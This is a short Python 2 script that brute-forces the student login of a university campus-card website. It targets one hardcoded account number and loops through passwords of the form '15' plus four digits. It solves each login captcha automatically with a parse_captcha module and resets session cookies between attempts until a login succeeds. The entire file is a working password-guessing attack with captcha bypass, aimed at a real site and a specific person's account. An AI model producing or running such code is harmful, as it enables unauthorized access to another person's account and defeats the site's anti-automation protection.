# -*- coding: utf-8 -*-
import urllib2
import parse_captcha
import urllib
from urllib2 import Request, urlopen
from cookielib import LWPCookieJar
import os

posturl = "http://ecard.sjtu.edu.cn/loginstudent.action"
picurl = "http://ecard.sjtu.edu.cn/getCheckpic.action"
homeurl = "http://ecard.sjtu.edu.cn/homeLogin.action"
userAgent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
home_folder = os.getenv('HOME')

cookie_jar = LWPCookieJar(os.path.join(home_folder, '.ecard-cookie'))
try:
    cookie_jar.load()
except Exception:
    pass


def get_page(url, data=""):
    request = Request(url)
    request.add_header('User-Agent', userAgent)
    if data:
        request.add_data(data)
    cookie_jar.add_cookie_header(request)
    response = urlopen(request)
    cookie_jar.extract_cookies(response, request)
    html = response.read()
    response.close()
    return html

get_page(homeurl)


name = "5110729018"
userType = "1"
loginType = "2"
imageFieldx = 31
imageFieldy = 4

ip = 0
error = 0
all_try = 0

while True:
    all_try += 1
    passwd = "15{:04d}".format(ip)
    print passwd, all_try, error
    open( "c.jpg", "wb").write(get_page(picurl))
    cp = parse_captcha.getstr("c.jpg")
    rand = cp
    print cp
    # input-type values from the html form
    formdata = { "name" : name, "userType":userType, "passwd": passwd, "loginType": loginType,"rand":rand, "imageField.x":imageFieldx, "imageField.y":imageFieldy}
    data_encoded = urllib.urlencode(formdata)
    content = get_page(posturl, data_encoded).decode('gb2312')
    print content
    if content.find(u"验证码") > 0 :
        error += 1
        cookie_jar.clear_session_cookies()
        get_page(homeurl)
        continue
    if content.find(u"密码") > 0 :
        ip += 1
        print ip
        cookie_jar.clear_session_cookies()
        get_page(homeurl)
    else:
        print ip
        break

